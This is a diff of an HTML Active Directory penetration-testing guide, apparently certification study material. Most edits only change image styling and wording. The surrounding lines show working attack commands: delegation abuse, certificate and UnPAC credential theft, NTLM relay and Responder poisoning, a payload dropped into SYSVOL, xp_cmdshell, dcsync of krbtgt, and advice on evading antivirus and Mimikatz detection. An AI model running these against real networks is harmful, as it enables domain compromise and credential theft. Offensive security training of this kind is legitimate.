 <p>Compromise a service account with constrained delegation, then impersonate Administrator to any allowed SPN. Impacket flow:</p>
 <pre><code class="language-bash"># Get a TGT for the compromised service account
 getTGT.py &lt;domain.local&gt;/&lt;service-user&gt;:'&lt;password&gt;'
@@ -2121,7 +2121,7 @@ psexec.py -k -no-pass domain.local/administrator@&lt;target-fqdn&gt;</code></pre
 
 <h3 id="cape-kerberos-unpac">6.16 UnPAC-the-Hash</h3>
 <p>When a certificate is used to authenticate via PKINIT, the resulting TGT contains a Privilege Attribute Certificate (PAC). One of its structures, <code>PAC_CREDENTIAL_INFO</code>, carries the user's NTLM hash. Pulling that hash out of the PAC gives you the account's NTLM without ever completing an NTLM handshake on the wire.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/unpac-the-hash-flow.png" alt="UnPAC-the-Hash flow extracting NTLM from a PKINIT PAC" style="max-width:80%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/unpac-the-hash-flow.png" alt="UnPAC-the-Hash flow extracting NTLM from a PKINIT PAC" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 <p>This is the standard follow-up to any ADCS primitive (ESC1, ESC3, Shadow Credentials, Golden Certificate). Certipy handles it in the auth step:</p>
 <pre><code class="language-bash">certipy auth -pfx &lt;user&gt;.pfx -dc-ip &lt;dc-ip&gt;
 
@@ -2182,7 +2182,7 @@ nc -lvnp 389
 
 <h2 id="cape-dacl-1-7">7. DACL Attacks I</h2>
 <p>DACLs are the ACL layer on every Active Directory object. Each entry says what a specific principal is allowed or denied to do to that object, and misconfigured entries are the single most common escalation path I see on mature engagements. A legitimate delegation like "helpdesk can reset user passwords" often reaches further than the person who wrote it intended, and that gap is exactly what BloodHound's edges surface at a glance. GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword, AddMembers, and AllExtendedRights each map to a specific set of primitives, and each shows up on real domains often enough to be worth memorizing.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/dacl-ace-permissions.png" alt="Windows security editor showing DACL ACE permissions on an AD object" style="max-width:80%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/dacl-ace-permissions.png" alt="Windows security editor showing DACL ACE permissions on an AD object" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h3 id="cape-dacl1-what-is-dacl">7.1 What is a DACL</h3>
 <p>A DACL is the list of ACEs attached to an object. Each ACE either allows or denies a specific right to a specific principal. AD objects with a DACL include users, groups, computers, OUs, and GPOs, nearly everything. Access decisions merge inherited and explicit ACEs at evaluation time.</p>
@@ -2249,11 +2249,11 @@ getTGT.py 'domain.local/user:pass'</code></pre>
 </ul>
 <h2 id="cape-dacl-2-8">8. DACL Attacks II</h2>
 <p>The second half of DACL work moves past the classic ACE edges and into the privileges and group memberships that quietly grant equivalent access. DCSync, SeBackupPrivilege, SeManageVolumePrivilege, PAC exploitation, Server Operators, DNS Admins, and macro-driven DCOM all belong in this bucket. Each hinges on a specific permission or group membership whose implications are not obvious to whoever provisioned it, and each shows up in real environments far more often than it should.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/dcsync-replication-rights.png" alt="DCSync replication rights delegated in Active Directory" style="max-width:80%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/dcsync-replication-rights.png" alt="DCSync replication rights delegated in Active Directory" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h3 id="cape-dacl2-dcom-excel">8.1 Exploiting AD with DCOM and Macro-Enabled Excel</h3>
 <p>Another artifact worth checking before any escalation attempt: legacy Group Policy Preferences (GPP) XML in SYSVOL. When it was still in fashion, admins would ship local account passwords through GPP, encrypted with a static key Microsoft later published. Any authenticated user could read the XML from SYSVOL and decrypt the <code>cpassword</code> field.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/gpp-cpassword-xml.png" alt="Groups.xml file in SYSVOL containing a cpassword field" style="max-width:75%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/gpp-cpassword-xml.png" alt="Groups.xml file in SYSVOL containing a cpassword field" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 <p>Requires admin on the compromised workstation. Craft an Excel file with a macro that spawns cmd.exe:</p>
 <pre><code class="language-vb">Sub AutoOpen()
     Shell "cmd.exe /c calc.exe"
@@ -2631,8 +2631,8 @@ copy payload.bat "\\&lt;dc-fqdn&gt;\SYSVOL\&lt;domain&gt;\Policies\{&lt;gpo-guid
 </ul>
 
 <h2 id="cape-adcs-9">9. ADCS Attacks</h2>
-<p>Active Directory Certificate Services (ADCS) is the CA that domains use to issue X.509 certificates for authentication, encryption, and signing. Its templates control who can enroll, for what purpose, and with which subject. When those templates drift, ADCS turns into one of the fastest paths to Domain Admin on Windows, cataloged as ESC1 through ESC15+ by the SpecterOps <em>Certified Pre-Owned</em> research. In practice, most environments running ADCS have at least one exploitable template, and Certipy will find it in under a minute.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/adcs-esc1-template.png" alt="ADCS ESC1 vulnerable certificate template configuration" style="max-width:80%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p>Active Directory Certificate Services (ADCS) is the CA that domains use to issue X.509 certificates for authentication, encryption, and signing. Its templates control who can enroll, for what purpose, and with which subject. When those templates drift, ADCS turns into one of the fastest paths to Domain Admin on Windows, cataloged as ESC1 through ESC15+ by the SpecterOps <em>Certified Pre-Owned</em> research. Most environments running ADCS have at least one exploitable template, and Certipy will find it in under a minute.</p>
+<p style="text-align:center;"><img src="/assets/images/cape/adcs-esc1-template.png" alt="ADCS ESC1 vulnerable certificate template configuration" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h3 id="cape-adcs-basics">9.1 Basics</h3>
 
@@ -2645,7 +2645,7 @@ copy payload.bat "\\&lt;dc-fqdn&gt;\SYSVOL\&lt;domain&gt;\Policies\{&lt;gpo-guid
 <thead><tr><th>Attribute</th><th>Meaning</th></tr></thead>
 <tbody>
 <tr><td><strong>Enrollment Rights</strong></td><td>who can request a cert from this template</td></tr>
-<tr><td><strong>Subject Name</strong></td><td>supplied by request or built from AD (crucial for ESC1)</td></tr>
+<tr><td><strong>Subject Name</strong></td><td>supplied by request or built from AD (the ESC1 hinge)</td></tr>
 <tr><td><strong>Extended Key Usage (EKU)</strong></td><td>what the cert can be used for</td></tr>
 </tbody>
 </table>
@@ -2993,7 +2993,7 @@ certipy auth -pfx administrator_forged.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
 
 <h4 id="cape-adcs-certipy-auth">9.3.18 Authenticating with the Certificate</h4>
 <p>Use the certificate to obtain a TGT and the target's NTLM hash. Certipy walks the PKINIT exchange for you and returns both in one command.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/pkinit-certificate-auth.png" alt="PKINIT certificate authentication exchange between client, KDC, and target" style="max-width:80%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/pkinit-certificate-auth.png" alt="PKINIT certificate authentication exchange between client, KDC, and target" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 <pre><code class="language-bash">certipy auth -pfx administrator.pfx -dc-ip <dc-ip></code></pre>
 <p>Sample output, TGT saved as .ccache, plus the NTLM hash of the impersonated user, which becomes reusable material for PtH and DCSync.</p>
 <h4 id="cape-adcs-certipy-auth-methodology">Methodology</h4>
@@ -3009,7 +3009,7 @@ certipy auth -pfx administrator_forged.pfx -dc-ip &lt;dc-ip&gt;</code></pre>
 <h2 id="cape-ntlm-relay-10">10. NTLM Relay Attacks</h2>
 <p>NTLM has one property that keeps it interesting: it is coercible. If I can force a victim to authenticate to a machine I control, and signing is not enforced at the far end, I can relay that authentication verbatim to a third-party service and act as the victim there. Coercion primitives keep multiplying (PetitPotam, DFSCoerce, WebClient triggers, and older printer-bug flavors), and every new one extends the reach of relay against DCs, ADCS Web Enrollment, and any SMB target where signing was left off.</p>
 <p>Responder handles the poisoning half of the chain, ntlmrelayx handles the relay itself. The trick to running them together cleanly is turning off Responder's own SMB and HTTP listeners so ntlmrelayx can catch the traffic instead.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/ntlm-relay-attack.png" alt="NTLM relay attack flow from victim through attacker to target service" style="max-width:85%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/ntlm-relay-attack.png" alt="NTLM relay attack flow from victim through attacker to target service" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h3 id="cape-ntlm-workflow">10.0 Baseline Workflow</h3>
 <p>Every relay chain shares the same first three steps: pick a target where signing is off, boot Responder without SMB/HTTP so ntlmrelayx catches the traffic, then coerce or wait for auth. The technique-specific methodology blocks below build on this baseline.</p>
@@ -3032,11 +3032,11 @@ python3 ntlmrelayx.py -tf targets.txt -smb2support</code></pre>
 
 <h4 id="cape-ntlm-what-is-llmnr">10.1.1 What is LLMNR</h4>
 <p>Link-Local Multicast Name Resolution is the fallback Windows uses when DNS cannot resolve a name. Devices on the same LAN ask each other via multicast, and the first host that answers wins. It replaced NBT-NS but kept the same design flaw: nothing prevents an attacker on the LAN from answering the multicast and impersonating the requested target long enough to capture the user's NTLMv2 handshake.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/ntlm-auth-flow.png" alt="NTLM authentication challenge-response exchange" style="max-width:80%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/ntlm-auth-flow.png" alt="NTLM authentication challenge-response exchange" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h4 id="cape-ntlm-how-poisoning-works">10.1.2 How LLMNR Poisoning Works</h4>
-<p>Responder answers name lookups with its own address. The victim connects thinking it has found the intended target, then offers an NTLMv2 handshake that Responder captures verbatim. In practice the best windows to run this are the morning login rush and the post-lunch period, when name resolution traffic is highest.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/ntlm-local-auth-flow.png" alt="Local NTLM authentication flow the poisoner impersonates" style="max-width:75%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p>Responder answers name lookups with its own address. The victim connects thinking it has found the intended target, then offers an NTLMv2 handshake that Responder captures verbatim. The best windows to run it are the morning login rush and the post-lunch return, when name resolution traffic is highest.</p>
+<p style="text-align:center;"><img src="/assets/images/cape/ntlm-local-auth-flow.png" alt="Local NTLM authentication flow the poisoner impersonates" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h4 id="cape-ntlm-responder">10.1.3 Running Responder</h4>
 <pre><code class="language-bash">python Responder.py -I &lt;interface&gt; -rdw</code></pre>
@@ -3303,7 +3303,7 @@ SpoolSample.exe &lt;target&gt; &lt;attacker-fqdn&gt;</code></pre>
 
 <h2 id="cape-adcs-attacks-11">11. Active Directory Trust Attacks</h2>
 <p>Trust relationships between forests exist to let users, groups, and services cross a boundary that would otherwise be closed. The same pathway is what turns a compromise in one forest into an incident in another. Three techniques cover most of what I use in practice: forged inter-realm TGTs, MSSQL database link chains, and unconstrained delegation coercion across the trust. Each has a different prerequisite set and a different noise profile, and it is worth knowing all three before touching a trust boundary in earnest.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/ad-forest-domain-structure.png" alt="Active Directory forest and domain structure showing trust relationships" style="max-width:85%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/ad-forest-domain-structure.png" alt="Active Directory forest and domain structure showing trust relationships" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h3 id="cape-trust-types">11.0 Trust Types and What Each Allows</h3>
 <p>The specific trust type determines what attacks apply. Four types cover almost everything encountered in the wild:</p>
@@ -3393,7 +3393,7 @@ EXECUTE('sp_configure "show advanced options", 1; RECONFIGURE; sp_configure "xp_
 <pre><code class="language-bash">Rubeus.exe monitor /interval:5 /filteruser:<target-dc>$</code></pre>
 
 <h4 id="cape-trust-trigger">11.3.3 Step 2: Trigger Forced Authentication</h4>
-<p style="text-align:center;"><img src="/assets/images/cape/printer-bug-attack.png" alt="Printer Bug (MS-RPRN) forcing a DC to authenticate to attacker-controlled host" style="max-width:80%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/printer-bug-attack.png" alt="Printer Bug (MS-RPRN) forcing a DC to authenticate to attacker-controlled host" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 <pre><code class="language-bash">SpoolSample.exe <target-dc-fqdn> <dc-fqdn></code></pre>
 
 <h4 id="cape-trust-inject">11.3.4 Step 3: Inject the Captured TGT</h4>
@@ -3716,8 +3716,17 @@ execute-assembly SharpKatz.exe --Command dcsync --User krbtgt --Domain <domain.l
   <li><input type="checkbox" data-id="cape-sliver-methodology-wf-7"> Rotate C2 channels and rebuild implants regularly during long engagements.</li>
 </ul>
 <h2 id="cape-evasion-13">13. Introduction to Windows Evasion Techniques</h2>
-<p>Modern Windows presents an evasion problem in three layers: static signature detection on artifacts, runtime scanning as code executes, and application whitelisting deciding what gets to run at all. Getting past each layer means understanding what triggers the detection and either changing what the sensor sees, or moving execution to a code path the sensor does not inspect. The techniques in this section are the primitives, not the payloads; combining them properly is what makes the difference between a burnt tool and a landed implant.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/windows-defender-ui.png" alt="Windows Defender UI showing real-time protection settings" style="max-width:75%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p>Windows defenders operate on three planes, and each fails in a different way.</p>
+<table class="custom-table">
+<thead><tr><th>Plane</th><th>What it inspects</th><th>Primary controls</th></tr></thead>
+<tbody>
+<tr><td>Static analysis</td><td>Bytes on disk before the process starts</td><td>Signature databases, PE structure heuristics</td></tr>
+<tr><td>Runtime scanning</td><td>Code and behaviour once the process is live</td><td>AMSI, ETW providers, EDR sensors</td></tr>
+<tr><td>Application whitelisting</td><td>Whether the binary is allowed to run at all</td><td>AppLocker, Windows Defender Application Control (WDAC)</td></tr>
+</tbody>
+</table>
+<p>Two moves cover every evasion. Change what the scanner sees, or run the code somewhere the scanner does not look. Signature bypasses (repacking, encryption, byte-level modification) sit in the first camp. Reflective loading, direct syscalls, and injection into already-trusted processes sit in the second. Every technique below is one of the two in a different disguise.</p>
+<p style="text-align:center;"><img src="/assets/images/cape/windows-defender-ui.png" alt="Windows Defender UI showing real-time protection settings" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h3 id="cape-evasion-av-signature">13.1 How Signature-Based Detection Works</h3>
 <p>Traditional AVs match byte strings against known-bad signatures. Two facts follow: (1) modifying a few bytes often defeats detection, (2) byte-string signatures are more precise than heuristics because they pin a specific sequence to find.</p>
@@ -3772,7 +3781,7 @@ static void Main(string[] args)
 
 <h3 id="cape-evasion-mimikatz">13.5 AV Evasion with Mimikatz</h3>
 <p>Mimikatz is signatured aggressively on every serious platform, but the source is open (<a href="https://github.com/gentilkiwi/mimikatz">gentilkiwi/mimikatz</a>) and the build system is a plain Visual Studio solution. Rebuilding from source with a handful of targeted changes routinely gets a working binary past the static detections that flag the upstream release. If the environment also enforces LSA Protected Process Light (PPL) on lsass.exe, the credential-dumping side of Mimikatz will need a driver-based unhook or a ProtectedProcessLight bypass; check the registry first.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/lsa-runasppl-registry.png" alt="RunAsPPL registry value enabling LSA Protected Process Light on lsass.exe" style="max-width:75%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/lsa-runasppl-registry.png" alt="RunAsPPL registry value enabling LSA Protected Process Light on lsass.exe" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 <p>Build environment on a dev VM (kept separate from the test VM):</p>
 <ul>
 <li>Windows 10/11 x64 with Defender disabled on the dev VM only.</li>
@@ -4229,7 +4238,7 @@ int wmain(void) {
 
 <h2 id="cape-mssql-14">14. MSSQL, Exchange, and SCCM Attacks</h2>
 <p>Enterprise infrastructure sitting alongside Active Directory quietly expands the attack surface well past the DC. MSSQL, Exchange, and SCCM each ship with privileged service accounts, permissive default configurations, and a set of legitimate administrative primitives that map directly onto lateral movement and privilege escalation when they are abused. These platforms are also often owned by different operational teams than AD itself, which is one of the reasons the same misconfigurations tend to persist for years after they are documented publicly.</p>
-<p style="text-align:center;"><img src="/assets/images/cape/ssms-object-explorer.png" alt="SQL Server Management Studio Object Explorer showing linked servers and databases" style="max-width:75%;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
+<p style="text-align:center;"><img src="/assets/images/cape/ssms-object-explorer.png" alt="SQL Server Management Studio Object Explorer showing linked servers and databases" style="border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,0.12);"></p>
 
 <h3 id="cape-mssql-attacks">14.1 MSSQL Attacks</h3>
 <p>MSSQL instances often run as domain service accounts with excessive privileges. Common attack primitives:</p>
